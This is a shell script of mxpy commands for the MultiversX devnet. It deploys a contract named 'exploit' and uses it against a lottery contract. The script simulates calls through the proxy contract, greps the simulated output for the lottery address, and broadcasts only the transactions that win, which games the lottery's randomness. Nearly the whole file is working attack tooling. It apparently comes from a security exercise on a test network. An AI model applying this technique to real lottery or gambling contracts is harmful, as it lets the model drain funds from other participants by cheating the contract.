PROXY=https://devnet-gateway.multiversx.com
CHAIN_ID="D"
 
LOTTERY_ADDRESS="erd1qqqqqqqqqqqqqpgquspc2ft4m7r820l52np04x22zeqven7l7wpq5enc2v"
WALLET_ALICE="${PWD}/exploit/wallets/alice.pem"
WALLET_BOB="${PWD}/exploit/wallets/bob.pem"
WALLET_TONY="${PWD}/exploit/wallets/tony.pem"
CONTRACT_ADDRESS="erd1qqqqqqqqqqqqqpgqu2ay24n0xtv09ehd6569ph2r399ymat97wpqg43pvq"
ALICE_ADDRESS="erd1aqd2v3hsrpgpcscls6a6al35uc3vqjjmskj6vnvl0k93e73x7wpqtpctqw"
ALICE_ADDRESS_HEX="$(mxpy wallet bech32 --decode ${ALICE_ADDRESS})"
ALICE_ADDRESS_HEXX="0x$(mxpy wallet bech32 --decode ${ALICE_ADDRESS})"
BOB_ADDRESS="erd1wh2rz67zlq5nea7j4lvs39n0yavjlaxal88f744k2ps036ary8dq3ptyd4"
BOB_ADDRESS_HEX="$(mxpy wallet bech32 --decode ${BOB_ADDRESS})"
BOB_ADDRESS_HEXX="0x$(mxpy wallet bech32 --decode ${BOB_ADDRESS})"
MARTA_ADDRESS="erd1uycnjd0epww6xrmn0xjdkfhjengpaf4l5866rlrd8qpcsamrqr8qs6ucxx"
MARTA_ADDRESS_HEX="$(mxpy wallet bech32 --decode ${MARTA_ADDRESS})"
MARTA_ADDRESS_HEXX="0x$(mxpy wallet bech32 --decode ${MARTA_ADDRESS})"
TONY_ADDRESS="erd1pqrfjusazp8yuf6nwgqu3u6m3qz2cgpupacds5h39v47ezn03llqjpqg74"
TONY_ADDRESS_HEX="$(mxpy wallet bech32 --decode ${TONY_ADDRESS})"
TONY_ADDRESS_HEXX="0x$(mxpy wallet bech32 --decode ${TONY_ADDRESS})"

deploy() {
 mxpy contract deploy --proxy=${PROXY} \
    --chain=${CHAIN_ID} \
    --bytecode=exploit/output/exploit.wasm \
    --pem="exploit/wallets/alice.pem" \
    --gas-limit=60000000 \
    --recall-nonce \
    --send \
    --metadata-payable \
    --arguments ${LOTTERY_ADDRESS}  
}
   
upgrade() {
 mxpy contract upgrade ${CONTRACT_ADDRESS} \
    --bytecode=exploit/output/exploit.wasm \
    --pem="exploit/wallets/alice.pem" \
    --chain=${CHAIN_ID} \
    --proxy=${PROXY} \
    --recall-nonce \
    --gas-limit=50000000 \
    --send \
    --metadata-payable \
    --arguments ${LOTTERY_ADDRESS} 
}

AMOUNT=10000000000000000

lotteryAddress() {
    mxpy --verbose contract query ${CONTRACT_ADDRESS} \
    --proxy=${PROXY} \
    --function="lotteryAddress" 
    } 

callProxy() {
    mxpy --verbose contract call ${CONTRACT_ADDRESS} --recall-nonce \
    --send \
    --proxy=${PROXY} \
    --chain=${CHAIN_ID} \
    --pem="exploit/wallets/alice.pem" \
    --recall-nonce \
    --gas-limit=5000000 \
    --function="proxyCall" \
    --outfile="${PWD}/exploit/interaction/simulate.json" \
    --arguments $AMOUNT  
} 

callProxySimulate() {
    mxpy --verbose contract call ${CONTRACT_ADDRESS} --recall-nonce \
    --simulate \
    --proxy=${PROXY} \
    --chain=${CHAIN_ID} \
    --pem="exploit/wallets/alice.pem" \
    --recall-nonce \
    --gas-limit=100000000 \
    --function="proxyCall" \
    --outfile="${PWD}/exploit/interaction/simulate.json" \
    --arguments $AMOUNT
} 


callWinnerTransaction() {
    mxpy tx send --infile="exploit/interaction/simulate.json" \
    --proxy=${PROXY}
}


callIfAddressInOutput() {
    if grep -q 'erd1qqqqqqqqqqqqqpgquspc2ft4m7r820l52np04x22zeqven7l7wpq5enc2v' ${PWD}/exploit/interaction/simulate.json; then
        echo "Winning transaction!"
        callWinnerTransaction
    else
        echo "Losing transaction!"
    fi
}

tryTransaction() {
    callProxySimulate
    callIfAddressInOutput
}

tryTransactionInBlock() {
    mxpy --verbose contract call ${CONTRACT_ADDRESS} --recall-nonce \
        --simulate \
        --proxy=${PROXY} \
        --chain=${CHAIN_ID} \
        --pem="exploit/wallets/alice.pem" \
        --recall-nonce \
        --gas-limit=100000000 \
        --function="proxyCall" \
        --outfile="${PWD}/exploit/interaction/simulate.json" \
        --arguments $AMOUNT  
    callIfAddressInOutput
}

  

simulateAndCall() {
    mxpy --verbose contract call ${CONTRACT_ADDRESS} --recall-nonce \
    --simulate \
    --proxy=${PROXY} \
    --chain=${CHAIN_ID} \
    --pem="exploit/wallets/alice.pem" \
    --recall-nonce \
    --gas-limit=100000000 \
    --function="proxyCall" \
    --outfile="${PWD}/exploit/interaction/simulate.json" \
    --arguments $AMOUNT && callIfAddressInOutput
}  